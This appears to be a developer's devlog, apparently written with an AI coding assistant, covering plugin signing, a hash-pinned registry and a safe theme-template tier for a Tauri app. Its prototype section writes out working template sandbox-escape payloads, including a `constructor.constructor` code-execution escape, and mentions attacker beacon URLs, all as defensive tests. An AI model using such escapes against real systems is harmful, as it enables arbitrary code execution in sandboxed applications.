- CI: `actions/attest-build-provenance@v2` added to all 8 plugin repos' `publish.yml` (new `id-token: write`/`attestations: write` permissions, one step staged right after building, before the release gets published), each bumped `0.3.0` → `0.3.1` specifically to force a new release through (without a version bump, the "already published, skip" check would never let a new signed release actually get cut, since the workflow's own path filters don't include `.github/workflows/**`). Every plugin README gained a `## Signing` section with the `gh attestation verify` command and an honest note about what's actually being proven

**Curated registry + revocation, both closed in one piece - Milestone 14 fully done.** Picked up immediately after signing, same session. Scoped down first via `AskUserQuestion`: install-time hash-pin check only, no startup revocation re-check against already-installed plugins - kept for a later pass if it turns out to matter, rather than building speculative UI for a case that hasn't come up yet.
- New repo `concourse-plugin-registry` - a single `registry.json`, one entry per hand-reviewed plugin: `{id, name, kind, repo, manifestUrl, wasmSha256}`. `manifestUrl` always points at a specific tagged release (`releases/download/vX.Y.Z/...`), never `releases/latest/...` - pinning against "latest" would mean silently trusting whatever gets published next with zero review of it, defeating the entire point. Bumping which version is listed is a deliberate manual edit (re-download, re-review, re-hash, re-pin), not automatic. README states plainly what "reviewed" actually means right now (one person, `smh0505`, reading the pinned commit before adding it) rather than implying a moderation process that doesn't exist
- `wasmSha256` computed from the *actual published release asset*, not self-reported by the plugin's own CI and not the same value as the Sigstore attestation's own digest - downloaded and hashed all 8 real `v0.3.1` release artifacts for real (`sha256sum`) rather than trusting a locally-rebuilt copy, since a real pin has to match what a user would actually download
- `scripts/validate.sh` + a CI workflow re-derives every entry's hash from its live `manifestUrl` on every push/PR and fails if it doesn't match `wasmSha256` - catches a copy-paste mistake in the registry itself before it ships, not just plugin-side bugs. Verified locally with an equivalent Python script first (no `jq` in this dev environment) before writing the real bash+jq version that actually runs in CI - all 8 entries checked out clean on the first real run
- New host module `plugin_registry.rs` (`fetch_plugin_registry` command, plain GET against the registry's raw `main` branch file - same trust model as fetching any other manifest URL already). `plugin_installer.rs`'s `install_plugin`/`install_wasm_plugin` gained an `expected_sha256: Option<String>` parameter - when present (only ever passed for a registry-sourced install, never a freeform-pasted URL), a mismatch is a **hard reject**, unlike the Sigstore check's advisory-only failure. The asymmetry is deliberate and stated in both the code and the registry's own README: an attestation mismatch just means "no attestation exists yet" (true for every pre-Milestone-14 release), but a pinned-hash mismatch means "this doesn't match what was actually reviewed" - a real, actionable signal, not a rollout-timing artifact
- Frontend: `pluginInstall.ts` gained `registryEntries`/`loadRegistry()`, and `previewInstall`/`confirmInstall` now thread an optional `expectedSha256` through end to end. `AddPlugin.vue` fetches the registry on mount and shows it as a second path alongside the existing freeform-URL field - clicking a registry entry's own Install button goes through the identical preview/confirm flow as a pasted URL, just with the pinned hash attached. A registry fetch failure (network down, repo unreachable) is silently swallowed rather than toasted - freeform install-by-URL was never gated by the registry's availability and shouldn't start erroring just because an *additional*, more-trusted path happened to be unreachable

**Version-bump automation, added after the milestone closed.** The manual "re-download,
re-review, re-hash, re-pin" busywork described above still had to happen by hand for every real
plugin release. User asked to automate the *mechanical* part of that (fetching + hashing +
committing) while explicitly keeping the human review/merge gate - not a request to trust
"latest" automatically, which would have quietly undone the entire point of a curated registry.
- Each of the 8 plugin repos' `publish.yml` now fires a `repository_dispatch` (`event_type:
  plugin-release`, payload `{repo, tag}`) to `concourse-plugin-registry` right after publishing
  a release. A new `scripts/bump-entry.sh` there re-downloads that exact release's manifest and
  `.wasm`, independently computes the real sha256 (never trusts a value the dispatch payload
  itself could have carried), and patches just that one entry's `manifestUrl`/`wasmSha256`. A
  new workflow, `bump-from-release.yml`, wraps that script and opens a PR rather than committing
  to `main` directly - the existing `validate.yml` (unchanged) re-verifies the hash independently
  on the PR and again on merge, so a bot-authored change gets the identical scrutiny a
  human-authored one would. Nothing is trusted-and-merged automatically; a human still has to
  read the diff and click merge
- Real end-to-end test (not just a code review) surfaced two actual bugs, both fixed before
  calling this done:
  1. The first cut wired the dispatch into a *separate* workflow triggered by `release:
     published`, matching the pattern the plugin repos already used for other automation. It
     never fired. Root cause: `publish.yml` creates its release via `softprops/action-gh-release`
     using the default `GITHUB_TOKEN`, and GitHub's loop-prevention rule means events created by
     that token don't trigger *other* workflows in the same repo - confirmed by cutting a real
     `v0.3.2` test release on `rawg-metadata-wasm-plugin` and watching the separate
     `notify-registry.yml` never run. Fix: call the dispatch as an inline step at the end of
     `publish.yml`'s own job instead (same `steps.check.outputs.exists == 'false'` guard), so it
     rides the same job/token context that just did the actual publishing rather than depending
     on a second event firing at all. Propagated to all 8 repos; the dead separate-workflow file
     removed everywhere
  2. Once the dispatch did fire, `bump-from-release.yml`'s PR step failed outright -
     `concourse-plugin-registry` didn't have "Allow GitHub Actions to create pull requests"
     enabled (off by default on a new repo). Enabled via
     `gh api -X PUT .../actions/permissions/workflow -f default_workflow_permissions=write -F
     can_approve_pull_request_reviews=true`. Retrying the same dispatch then hit a second,
     related issue - the bump branch already existed from the first failed attempt, so the plain
     `git push` was rejected as a non-fast-forward. Fixed by force-pushing the bump branch (it's
     disposable and bot-owned, always rebuilt fresh from `main`, so a leftover branch from a
     retried run should just be replaced) and skipping `gh pr create` if a PR is already open for
     that branch, so a retried dispatch is idempotent instead of erroring
- One more one-off observed and left as-is rather than engineered around: the first PR's
  `validate.yml` run came back `action_required` and needed a single manual approval
  (`gh api -X POST .../actions/runs/<id>/approve`) before it would run at all - read as a
  first-time-bot-contributor gate on a brand-new repo, not a recurring requirement. Confirmed by
  observation: the post-merge `validate.yml` run on `main` and the dispatch used for the actual
  test both went straight to `success` with no gate the second time
- Test releases used real infrastructure end to end rather than synthetic data - genuine `v0.3.2`
  then `v0.3.3` patch bumps (no functional change) on `rawg-metadata-wasm-plugin`, a real signed
  release, a real registry PR, merged for real once verified (`registry.json` now legitimately
  points at `v0.3.3`, not left pinned to stale test data)

## 1.0.0 — Core Roadmap Closed, Post-1.0 Roadmap Opened
User call: bump `0.10.0` -> `1.0.0` now rather than waiting on the two leftover items (Milestone
7's ROM scanner sub-item, Milestone 12's Xbox/EA/Ubisoft stretch goal, the latter entirely
unstarted). Judgment: Milestones 1–6 and 8–11, plus both security milestones (13, 14, the most
recently closed and arguably the highest-stakes work in the whole roadmap), are done; the two
remaining items are an unstarted stretch goal and one sub-item of an otherwise-closed polish
milestone, neither blocking real-world use the way the original "post-M12" versioning note
implied when it was written (back when M12 was still the *next* milestone in sequence, not a
skipped-over stretch goal that later milestones passed by).
- Bumped `package.json`, `src-tauri/Cargo.toml`, `src-tauri/tauri.conf.json` to `1.0.0` together;
  `cargo check` regenerated `Cargo.lock`'s matching `concourse` package entry rather than hand-editing it
- `milestones.md` restructured rather than just bumping the header: Milestone 7's unstarted ROM
  scanner sub-item and all of Milestone 12 moved out into a new `Post-1.0 Roadmap` section
  (renumbered Milestone 15/16 there), leaving both source milestones fully checked. Chose to
  keep calling them "Milestones" (not "Phases," despite that being the term floated) - it's the
  same document, same devlog cross-reference convention, just a second wave numbered
  continuously from 14, not a different kind of unit
- `CLAUDE.md`'s versioning rule rewritten to match: the "stay 0.x until post-M12" language no
  longer made sense once M12 was consciously deferred rather than completed-then-followed;
  replaced with "1.0.0 marks the core roadmap done, Post-1.0 minor bumps track closing a
  Post-1.0 Roadmap milestone"

## Milestone 17 (legacy) — External Theme Plugins: Component-Override Tier (re-reviewed, still blocked)
**Superseded** - milestones.md's Milestone 17 now tracks a different, narrower mechanism (a
constrained template tier), scoped from the Brick Block measurement below. Kept here as the
historical record; its actual conclusion (raw-JS/WASM component-override for external plugins is
blocked) is still correct and unaffected by the entry that replaces it in milestones.md.

Re-review requested directly: does Milestone 13/14 closing change the original Milestone 9
"blocked" verdict on the `slots` tier for external theme plugins? Worth actually re-deriving the
reasoning rather than reflexively re-affirming the old note, since the premise it was originally
conditioned on ("not pursued until/unless Milestone 13/14 land") had genuinely changed.
- Re-traced where Milestone 13's scoping actually lives before concluding anything -
  `grep`-confirmed `host::*` capability gating (path/URL allowlists, spawn-process permission
  gate) is implemented entirely inside `wasm_plugin_runtime.rs`/`wasm_plugins.rs`, i.e. the WASM
  host-function layer. That's the load-bearing fact: Milestone 13 scopes what a WASM plugin's
  own enumerated primitives can reach, a boundary that only exists *because* WASM plugins go
  through a typed host interface at all. Raw JS via `defineAsyncComponent` was never going to go
  through that layer - it runs directly in the app's own JS realm - so tightening that boundary
  has zero effect on the raw-JS option's actual exposure. The two didn't get closer together;
  Milestone 13 improved one lane (WASM) that was already separate from the other (raw JS) from
  the start
- Milestone 14 (signing, curated registry, revocation) doesn't move this either, for a different
  reason: it's a provenance/trust-in-the-author gate applied at install time, not a runtime
  capability boundary. A raw-JS theme bundle that's signed and registry-pinned is still, once
  running, full-realm code with unmediated access to every `#[tauri::command]` and every Pinia
  store in memory - proving "this came from that repo's CI" says nothing about what it's allowed
  to touch once it's executing
- Net verdict: still blocked, and for the *original* two reasons (WASM structurally can't carry
  a live Vue component; raw JS has no capability boundary to scope at all), not a new one -
  Milestone 13/14 closing was a real, legitimate reason to re-check, it just doesn't turn out to
  bear on this specific wall. Re-confirmed no third mechanism has emerged since Milestone 9's
  review either - the Vue-runtime-template-compiler idea documented there remains a different,
  narrower feature (a whitelisted template string) than an actual component-override tier, not a
  way to unblock `slots` itself. Closed Milestone 17 on this negative-but-final result rather
  than leaving it open pending some future condition that isn't currently identifiable

## Milestone 17 — External Theme Plugins: Constrained Template Tier (scoped, not built)
Prompted by a direct observation: Brick Block wasn't just a theme, it was Milestone 5's own
built-in proof that component-override themes have real demand and work as a mechanism. That
reframes the legacy Milestone 17 above - its "still blocked" verdict is about whether *external*
code can safely do what Brick Block does, not about whether the underlying idea (the Vue
template-compiler tier, noted since Milestone 9) is worth building. Rather than write that
verdict into milestones.md on vibes, measured it directly against Brick Block first.

- **Measured Brick Block's actual gap against the base `GameCard.vue`/`BigPictureTile.vue`,
  line by line**, instead of assuming `slots` themes are un-portable wholesale. Result: the part
  of Brick Block's identity that reads as "the theme" at a glance - its full color palette,
  `--font-pixel` - was *already* 100% `cssVariables`-portable and never depended on `slots` at
  all (it applies app-wide, to buttons/forms/nav, with zero component override). The real,
  `slots`-dependent gap was three things: (1) a static `★` glyph replacing the base's dynamic
  `{{ game.title.charAt(0).toUpperCase() }}` placeholder, (2) one extra wrapper element,
  `.brick-frame`, that the base tile has no equivalent of at all, (3) missing CSS-variable hooks
  on the base components for things Brick Block wants styled that the base never exposed as
  variables (balloon border, balloon `border-radius` override, per-element `font-family`). Of
  those three, (3) turned out to be a wholly separate, unrelated task - it's just base-component
  CSS not exposing enough knobs, fixable by adding variables to first-party code, nothing to do
  with any external-plugin mechanism at all
- **Checked whether the tier even needs the risky part of the original idea - `{{ }}`
  interpolation - against that measured gap**, rather than assuming the idea's own stated caveat
  ("interpolations are real evaluated JS, not inert") was the load-bearing risk here. It mostly
  isn't: Brick Block doesn't introduce a single non-trivial mustache expression - it *removes*
  the one the base had, replacing a computed method-call expression with static literal text.
  What survives unchanged from the base into Brick Block are simple directive/attribute bindings
  (`v-if="game.cover_art_url"`, `:src="game.cover_art_url"`, `:alt="game.title"`,
  `:class="{ focused }"`) - same expression-evaluation category as `{{ }}` (a real evaluated JS
  expression against a render-context scope), but the simplest possible slice of it: single-field
  property access, no method calls, no computed logic, no formatting helpers. So the concrete
  scope a whitelisted render context needs to cover, for this measured case, is narrower than
  the original note assumed - plain read-only access to `game`'s own fields, nothing more
- **Surfaced a real scope gap the original idea never accounted for**: Brick Block's footer
  buttons (`launchGame`/`fetchMetadata`/`openEdit`/`deleteGame`) are real store-action dispatches,
  not display data - and a template tier's whitelisted scope, as originally framed ("`game`
  fields plus known formatting helpers"), has no provision for exposing actions at all. Brick
  Block itself doesn't stress-test this - its footer is structurally identical to the base,
  reskinned only via CSS, never rearranged - so this specific measurement can't answer whether
  action-dispatch needs to be part of the tier. Left explicitly open in milestones.md rather than
  silently assumed either way, since a future theme that *does* want to restructure the action bar
  would hit this immediately
- Net effect: replaced the legacy Milestone 17 entry in milestones.md rather than appending
  alongside it - the new entry tracks a genuinely different, narrower mechanism (a scoped
  template tier) with a concrete measured basis (Brick Block) instead of the original's
  hypothetical Playnite-XAML comparison, and the legacy entry's own "blocked" conclusion (about
  `slots`/raw-JS specifically) stays correct and undisturbed above, kept for history rather than
  deleted

**Started the CSS-variable-surface expansion item.** Border-radius was already themeable
(`--radius-md`, used by the global `button` rule in `App.vue`) - the actual gap was border
*width*, hardcoded `1px` there with no variable at all. Added `--button-border-width` to
`:root` and wired it into the global `button` rule, rather than scoping a new variable to
GameCard's footer buttons specifically - explicit user direction: the lever should cover every
button app-wide, not just the ones next to a cover image, so a future theme can go
thick-bordered everywhere with one variable instead of needing `slots` just to reach GameCard's
footer. `GameCard.vue`'s own footer buttons needed no edit - they already inherit the global
`button` rule with no local override, so they pick up the new variable automatically. Brick
Block's own hardcoded `2px` footer-button border (in its scoped component CSS) is left as-is
for now rather than retroactively migrated to the new variable - a separate, deliberate call
for later, not bundled into this step. Balloon-specific hooks (border, `border-radius`
override, per-element `font-family` on `.balloon-title`/`.balloon-playtime`) remain the
outstanding part of this milestone item.

**Balloon hooks added, closing out the CSS-variable-surface item.** Unlike
`--button-border-width`, these follow the same undeclared-opt-in pattern as `--font-pixel`
(not registered in `App.vue`'s `:root` token scale, just referenced with a fallback at the
point of use) rather than the base design-token pattern - they're per-element hooks a theme
opts into, not a scale every element consumes by default:
- `.balloon`'s `border` gained `var(--balloon-border-width, 0)` (defaults to an invisible
  0-width border, matching prior behavior exactly for every existing theme that doesn't set it)
- `border-radius` changed from a hardcoded `var(--radius-sm)` to `var(--balloon-radius,
  var(--radius-sm))` - a dedicated per-element override rather than repurposing the shared
  `--radius-sm` token directly, since other `--radius-sm` consumers elsewhere in the app aren't
  necessarily meant to go sharp just because a theme wants a chunky balloon
- New `.balloon-title, .balloon-playtime { font-family: var(--balloon-font-family, inherit); }`
  rule - `inherit` as the fallback is behaviorally identical to the previous no-declaration
  state (already inherited from the teleported-to `<body>` ancestor), so no regression
- Brick Block's own `.brick-balloon` override is untouched and still wins by selector
  specificity (two classes beats one) - not migrated onto the new variables as part of this
  step, same deliberate deferral as the button-border-width case above

**Action-dispatch boundary decided: display/structure-only, no callable exposure.** A template
tier's whitelisted render context gets `game`'s own read-only fields, nothing else - the action
bar (play/edit/remove/fetch-metadata) is always host-rendered at a fixed insertion point,
restyleable via CSS variables (same lever as the button-frame/balloon work above) but not
restructurable, removable, or rearrangeable by a theme's template. Reasoning: Brick Block is the
only concrete evidence this app has ever had of component-override demand, and it never touches
the footer's structure at all - identical markup and `@click` handlers to the base, styled only
via CSS. Zero measured demand for restructuring the action bar exists. Exposing store actions as
template-callable would be real, non-trivial attack surface (a compiled template invoking
mutations, not just reading data) built speculatively for a need that's never once shown up -
the same over-scoping M17's re-review was built to avoid. If a real theme ever needs to
rearrange the action bar, that's new, separately-scoped work when it actually happens, not
designed in now against a hypothetical.

**Prototyped the naive template-compile approach - found it's a full sandbox escape, verified
empirically rather than assumed.** Added `@vue/compiler-dom` as an explicit dependency (was
already present transitively via `vue`, pinned to match `vue`'s own `^3.5.13` range rather than
relying on an undeclared transitive version). Before wiring anything into `GameCard.vue`, wrote
two throwaway Node scripts to test the exact mechanism devlog had been assuming was safe:
`compile(template)` from `@vue/compiler-dom`, then `new Function("Vue", code)(Vue)` to
materialize the render function - the same pattern the real Vue browser build uses internally
for `Vue.compile`/`compileToFunction`.
- **Test 1**: `{{ typeof window !== "undefined" ? window.secret : "no-window" }}`, with
  `globalThis.window = { secret: "LEAKED-FROM-GLOBAL" }` set beforehand. Compiled code wraps the
  expression in `with (_ctx) { ... }`, but `with` only intercepts identifiers *found on*
  `_ctx` - anything not found there resolves through the normal scope chain, which for a
  `new Function`-created function bottoms out at the real global object. Output:
  `"LEAKED-FROM-GLOBAL"` - confirms the earlier note in this file ("no reaching window/document
  unless explicitly put in scope") was wrong, and it was caught by testing before building on
  it, not after
  - This matters for something concretely: earlier, the risk-of-arbitrary-code question was
    debated for the *naive raw-remote-JS* `slots` alternative and judged clearly worse than
    WASM. This test shows the "constrained template" idea carries the identical risk via a
    completely different-looking mechanism (directive/mustache compilation instead of
    `import()`), just less obviously
- **Test 2, the more serious one**: `{{ game.constructor.constructor("return typeof process")() }}`
  with only `{ game: { title: "Test" } }` passed as context - no bare `window`/`document`
  identifier referenced at all. `game.constructor` is `Object`, `Object.constructor` is
  `Function`, and calling it executes arbitrary code - classic `constructor.constructor`
  sandbox escape (the same unfixable class of bug that made Google abandon AngularJS's
  expression sandbox in 1.x). Output: `"object"` (the real `typeof process` from the actual
  execution environment). This is the load-bearing finding - it means passing *only* `game`'s
  own fields into scope, the exact "safe, minimal whitelist" this milestone concluded was fine
  two entries above, is fully equivalent to raw JS execution. Freezing the context object
  doesn't help either - `Object.freeze` blocks writes, not reads of inherited `.constructor`.
  **Conclusion: the naive same-realm compile-and-eval approach is not being built.** It carries
  Milestone 9's original raw-JS verdict exactly, just less visibly

**Investigated real isolation instead of abandoning the tier outright**, per explicit
direction after reporting the escape - a dedicated Web Worker, rather than running the compiled
render in the main JS realm. Verified the two load-bearing claims concretely rather than
assuming a Worker actually helps:
- `grep`-confirmed `@tauri-apps/api/core.js`'s `invoke()` is literally
  `window.__TAURI_INTERNALS__.invoke(cmd, args, options)` - every Tauri command call is
  `window`-scoped by construction, not by convention. A `DedicatedWorkerGlobalScope` has no
  `window` at all (only `self`); referencing it is a real `ReferenceError`. A compiled-template
  escape running inside a Worker structurally cannot reach a single Tauri command - no
  file/process/registry/network host primitive, nothing
  - Same reasoning extends to Pinia stores - they live in the main thread's JS heap; a Worker is
    a genuinely separate execution context with its own heap, not just a different scope object,
    so there's no direct-memory-access path at all, unlike the raw-JS-`slots` case where a
    component literally runs in the same realm as every store
- Checked `tauri.conf.json`'s CSP (`connect-src ipc: http://ipc.localhost`, no separate
  `worker-src` set, which per spec falls back to `script-src 'self'` for the worker's own script
  loading). Workers inherit the owning document's CSP for their own outbound requests - so a
  fully-escaped worker's `fetch`/`XMLHttpRequest` calls are still restricted to
  `ipc:`/`http://ipc.localhost`, same lockdown the main thread already has. Real attacker
  exfiltration (a genuine `https://attacker.com` endpoint) stays blocked either way
- Already had indirect evidence the render pipeline itself has no hidden DOM dependency - both
  escape tests above ran the full `compile()` + `createElementBlock`/`toDisplayString` pipeline
  in plain Node (no `document`, no DOM shim) without error, so a Worker (which also lacks DOM)
  isn't blocked by the pipeline needing real DOM APIs it doesn't have
- Residual risk in this design, honestly stated rather than glossed: a compromised worker can
  still burn CPU/memory (mitigable with a render timeout + `worker.terminate()`), and the design
  needs one more real piece not yet built - since the worker has no DOM, it can't produce a live
  VNode tree with functions/Symbols in it (not structured-clone-able via `postMessage` anyway);
  it has to emit a **plain-data description** of the result (tag name, string/number children,
  known prop names only), and the main thread must treat that as inert data reconstructed
  against a strict allowlist - never execute or trust-render anything the worker sends without
  that revalidation step. That protocol + validator is real, unbuilt engineering, not a detail
- Paused here on explicit direction - findings logged, actual worker script/message-protocol/
  validator implementation not started this session. `@vue/compiler-dom` stays as an explicit
  dependency for when this is built (same package, same use, no churn from removing and
  re-adding it later)

**Tried a real data-only conversion of Brick Block, given the template tier is blocked for
now.** Added `brick-block-data-theme` to the `data-theme-plugins` repo (separate `id` from the
built-in `brick-block-theme` - same id would collide in the loader/`enabled_plugins`, they need
to coexist as genuinely different plugins, not the same one migrated). The built-in `slots`
version is untouched, not retired - this is a parallel, honestly-scoped alternative, not a
replacement.
- Full color palette carried over unchanged - was already 100% portable, as measured earlier
- Also carries the button-border-width/balloon-border-width/balloon-radius/balloon-font-family
  hooks added earlier this session - genuinely more of Brick Block's look is expressible now
  than it would have been before those were added
- **Real, not graceful, loss: the pixel font.** Data themes have zero code/asset-loading
  capability - `cssVariables` are plain property values, there's no way to inject an
  `@font-face` rule the way Brick Block's own `index.ts`'s `injectFont()` does. Checked whether
  the CSS stack's second choice, `"Press Start 2P"`, would at least provide *some* pixel-font
  fallback - it doesn't: `grep`-confirmed it's never actually loaded anywhere else in the app
  either (no bundled `@font-face`, no CDN link), so it was already unreachable in practice even
  in the built-in version unless a user happened to have that exact font installed system-wide.
  The data-theme version's `--balloon-font-family` therefore falls straight through to the
  default sans stack - the pixel-font identity is fully gone, not softened
- Also lost, both genuinely structural rather than stylable: the star-glyph cover placeholder
  (content, not CSS) and BigPictureTile's `.brick-frame` wrapper element (an extra DOM node the
  base tile has no equivalent of) - exactly the two items this milestone's Brick Block
  measurement already identified as needing the (currently blocked) template tier, now
  confirmed by an actual conversion attempt rather than the earlier static analysis alone

**Pivoted from Worker isolation to a JSON-AST rendering tier**, after weighing three outside
alternatives (Gemini's suggestions, brought back for a second opinion): iframe sandboxing,
server-driven UI via a JSON AST, and code-signed dynamic `import()`. Evaluated each against what
this milestone had already verified, not just in the abstract:
- **Code-signed dynamic import - rejected outright.** This is raw-JS `slots` with a signature
  check added. Milestone 14 already drew this exact distinction: signing proves *provenance*
  ("this really came from that repo's CI"), not *safety* - a malicious author's own CI signs
  their malicious code perfectly validly. Doesn't touch the actual problem (full realm access,
  `invoke()` reachable, Pinia reachable) at all - conflating signing with sandboxing was already
  identified as a mistake to avoid back in that milestone
- **Iframe sandboxing (`sandbox="allow-scripts"`, no `allow-same-origin`) - a real alternative
  to the Worker plan, comparable isolation, strictly more attack surface for capability this
  tier doesn't need.** An opaque-origin iframe can't reach the host's `window` or Pinia, same
  structural isolation property already verified for Workers - but unlike a Worker, it has a
  real `document`, so a compromised template inside it can still build actual DOM (phishing
  overlays, `<img src="https://attacker/...">` beacons) natively. Milestone 17 scoped this tier
  as display/structure-only with no ambition for live interactive UI, so the iframe's extra DOM
  power is pure unused risk here - worth it only if the tier's ambition ever grows past what's
  actually measured
- **JSON-AST / server-driven UI - adopted.** Fundamentally different in kind from both other
  options, not just a variant: there is no expression evaluator at all. A theme submits data
  (e.g. `{type: "if", test: {field: "cover_art_url"}, then: {type: "img", src: {field:
  "cover_art_url"}}, else: {type: "text", content: "★"}}`), and a hand-written interpreter -
  fully first-party code, no third-party input ever reaches `eval`/`with`/`new Function` -
  walks it, choosing tags from a fixed allowlist and resolving `{field: ...}` references via
  plain object property lookup. There's no `.constructor.constructor` escape possible because
  there's no code-execution primitive to escape *from* in the first place - the interpreter
  itself, not a sandboxed realm, is the entire security boundary. This sidesteps the exact bug
  class the compiler-dom prototype hit (verified above), and does it more cheaply than the
  Worker plan: no iframe/Worker, no postMessage structured-clone boundary, no output-validator
  layer needed, because nothing untrusted ever executes anywhere, contained or not
- Also matches Brick Block's measured gap precisely - conditional image-or-placeholder, static
  literal content, one wrapper element are all directly expressible as AST node types, and
  nothing measured needs more than that
- Worker isolation work above stays in devlog as a real, verified, sound design - not wrong,
  just superseded by a cheaper and stricter option found afterward. Milestone 17's plan now
  targets the AST vocabulary + interpreter instead of the worker/message-protocol/validator

**Designed the AST vocabulary**, kept deliberately small and validated directly against Brick
Block's two measured gap items rather than designed in the abstract:

```ts
type GameField = "cover_art_url" | "title";
type FieldTransform = "firstLetterUpper";
interface FieldRef { field: GameField; transform?: FieldTransform; }
type AstNode =
  | { type: "if"; test: FieldRef; then: AstNode; else?: AstNode }
  | { type: "element"; tag: "div" | "span"; class?: string; children?: AstNode[] }
  | { type: "image"; class?: string; src: FieldRef; alt: FieldRef }
  | { type: "text"; content?: string; field?: FieldRef };
```

- `image` is its own node type rather than `element` with a generic `attrs` bag - hardcodes
  exactly `src`/`alt` as bindable. No generic attribute dict exists anywhere in the format, so
  there's no future path for an arbitrary attribute name (`onerror`, a `style` containing
  `url(...)`) to ever reach the interpreter - closed by construction, not by a denylist that
  would need maintaining
- `FieldRef.field` is a closed enum, not arbitrary property access on `game` - an unrecognized
  field name should reject the whole manifest at install/parse time (fail closed), not silently
  render empty
- `transform` is a fixed enum dispatched by string match on the host side to a real named
  function - covers the base component's `charAt(0).toUpperCase()` need without introducing
  any method-call syntax into the format at all
- No event handlers, no interactive tags - `tag` enum is `div`/`span` only (plus the separate
  `image` node) - matches the already-decided action-dispatch boundary (footer stays
  host-rendered) by construction rather than by convention
- Validated against both Brick Block gap items: the glyph swap is a straightforward
  `if`/`image`/`else`-`text` tree; wrapping that same subtree in one more `element` node with
  `class: "brick-frame"` covers the wrapper-div gap too. Vocabulary is sufficient without being
  any bigger than what's actually needed
- One real residual risk flagged, not a code-execution one: a maliciously huge or deeply-nested
  manifest could still cost excessive render time/stack depth. Needs a depth cap (e.g. 5) and a
  total node-count cap (e.g. 50) enforced by the interpreter itself - a DoS guard to build
  alongside the interpreter, not a gap in the vocabulary's design

**Built the interpreter and verified it for real, not just typechecked.**
- `src/theme/cardVisualAst.ts` - `validateCardVisualAst` (the single gate untrusted manifest
  data passes through: closed `GameField`/`FieldTransform` enums, `MAX_DEPTH`/`MAX_NODES`
  caps, fail-closed on anything unrecognized) and `renderCardVisualAst` (only ever called on
  already-validated output, so the render path itself doesn't re-defend against malformed
  input on every call - the validator is the boundary, not the renderer). `text` nodes return a
  bare string rather than a wrapped element, so a themed placeholder's styling (set on its
  `element` parent) applies directly instead of through an extra spurious node
- `src/theme/cardVisualRegistry.ts` - validates once at theme-activation time (mirrors
  `slotRegistry.ts`'s shape), not per-render; an invalid AST logs and falls back to the built-in
  markup rather than breaking theme activation entirely
- `ThemePlugin.cardVisual?: unknown` - deliberately untyped as `AstNode` in the interface
  itself, since the raw value is untrusted regardless of which plugin kind it arrives from
  (TS-authored built-in vs. data-theme JSON) and always has to go through the validator before
  anything trusts it
- Wired into `GameCard.vue` (renders `CardVisualRenderer` when an active AST exists, falls back
  to the original `img`/`cover-placeholder` markup otherwise - footer/balloon/fetch-overlay
  untouched, matching the decided action-dispatch boundary) and `theme.ts`'s activate/deactivate
  lifecycle (parallel to `setActiveSlots`/`clearActiveSlots`)
- `bun run build` (vue-tsc + vite build) passes clean
- **Verified behavior directly**, not just "it typechecks" - wrote throwaway scripts (same
  pattern as the earlier compiler-dom escape tests) exercising the real module: (1) Brick
  Block's actual glyph-swap shape renders the image branch when `cover_art_url` is set and the
  `★` text branch when it isn't; (2) wrapping that same subtree in one more `element` node
  reproduces the `.brick-frame` wrapper case; (3) an unknown field name (tried smuggling
  `"constructor"` specifically, given what broke the compiler-dom prototype) is rejected;
  (4) an unknown node type (`"script"`) is rejected; (5) depth overflow and (6) node-count
  overflow both reject rather than silently truncating. All fail-closed, none silently coerced
- Both of Milestone 17's remaining build items (interpreter, acceptance test) are done. What's
  left: the manifest-signing addon, and the separately-tracked registry `theme`-kind follow-up

**Built the manifest-signing addon - Milestone 17 fully closed.** `verify_plugin_provenance`
(Milestone 14) turned out to already be fully generic - it just hashes and Sigstore-verifies
whatever `&[u8]` it's given, nothing WASM-specific in its own logic at all. The only real work
was threading a `manifest_url` parameter into `install_data_theme` (previously only took
`dir`/`manifest_bytes`, no URL - never needed one before) and calling the exact same
`parse_github_owner_repo`/`verify_plugin_provenance` pair `install_wasm_plugin` already uses,
against the manifest's own bytes instead of a `.wasm` binary.
- `install_data_theme` is now `async` (verification is a network call); both call sites updated
  (`install_plugin`'s dispatch, and the existing real-HTTP-round-trip test)
- Replaced the old hardcoded `verified: false, "Not applicable: data-only themes have no code
  to verify"` - that reasoning held when themes were colors-only, but a manifest carrying a
  `cardVisual` AST is real content worth tamper-detecting even though it's still never
  executable. Same asymmetry as the WASM path, stated in the new doc comment: this only proves
  the manifest is unmodified since that repo's CI published it, not that its author is
  trustworthy - that's the registry's review process once extended to a `theme` kind (see the
  separately-tracked follow-up), not this
- Frontend needed zero changes - `pluginInstall.ts`'s `InstallResult.verified`/
  `verificationNote` and its post-install toast were already generic across every plugin kind,
  never WASM-specific to begin with
- `cargo check` clean; full `cargo test` suite passes (4/4), including the updated real-HTTP
  round-trip test, now asserting `!result.verified` explicitly (a localhost test server isn't
  hosted on github.com, so this exercises the real "not verified" branch, not just the happy
  path)
- Milestone 17 is now fully closed: vocabulary, interpreter, acceptance test, signing addon.
  Only the deliberately-separate registry `theme`-kind follow-up remains outside its scope

**Registry `theme`-kind follow-up, done.** Real complication surfaced before writing anything:
`data-theme-plugins`' `release-themes.yml` deliberately reuses one release tag (`themes`)
across every push, for a stable freeform-install URL - checked, not assumed, and confirmed via
its actual workflow file. That means `.../releases/download/themes/<id>.json` is functionally
equivalent to `releases/latest/...`, the exact anti-pattern the registry's own README already
rejects (a future unrelated push could change that asset's bytes with zero new review ever
happening). Presented this to the user as a real fork rather than picking silently: change
`data-theme-plugins`' release model to match the WASM repos' per-version tags (breaks the
stable-URL property that model was built for), or pin against a commit-SHA'd
`raw.githubusercontent.com` URL instead (immutable regardless of the repo's own release model,
no changes needed there). Went with the latter.
- `registry.json` gained `brick-block-data-theme` - `manifestUrl` is
  `raw.githubusercontent.com/smh0505/data-theme-plugins/<commit-sha>/themes/brick-block-data-theme/manifest.json`
  (the exact commit that introduced the file, found via `git log -1 -- <path>`), `wasmSha256`
  is the real sha256 of that URL's actual bytes (fetched and hashed for real, not assumed)
- Caught a real mistake mid-edit: the `Edit` that added the new registry entry accidentally
  truncated the adjacent `rawg-wasm` entry's `wasmSha256` in the process (a copy-paste slip in
  the replacement string). Caught immediately by re-reading the file after the edit rather than
  trusting the diff blind, fixed before it ever reached a commit
- `scripts/validate.sh` branches on `kind` now: `theme` entries hash `manifestUrl`'s own bytes
  directly (no `.entry` sibling lookup - there's no separate binary for a data-only theme to
  begin with), every other kind keeps the existing sibling-`.wasm` logic unchanged. Pushed and
  confirmed the real CI run passes clean for the new entry, not just locally reasoned about
- README updated to document the new `kind` value, the differing pinning convention per kind,
  and that `theme` entries are added/re-pinned by hand - `data-theme-plugins` doesn't fire a
  release dispatch at all, and its shared-tag model doesn't fit `bump-entry.sh`'s
